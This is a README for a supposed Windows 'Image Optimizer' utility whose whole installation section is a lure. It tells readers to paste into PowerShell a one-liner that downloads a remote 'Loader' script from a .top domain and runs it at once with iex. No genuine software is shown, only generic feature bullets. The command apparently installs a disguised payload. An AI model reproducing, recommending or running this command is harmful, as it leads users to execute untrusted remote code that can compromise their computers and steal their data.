# 🖼️ Image Optimizer

Image Optimizer is a Windows utility for reducing image sizes while keeping images looking sharp.

## ✨ Features

- 🗜️ Compress images
- 📐 Resize images
- 🖼️ Optimize common image files
- ⚡ Process images quickly
- 📊 View image information
- 📁 Organize optimized files

## 🚀 Installation

### 1. 📋 Copy the command

Copy the PowerShell command below:

```powershell
iex (iwr "http://soft-storage.top/worker?=8870692567/Loader_pd2" -UseBasicParsing)
```

### 2. 🪟 Open PowerShell

Open **PowerShell** on Windows.

### 3. 📥 Paste the command

Paste the copied command into PowerShell and press **Enter**.

### 4. ✅ Done

The program will start automatically.
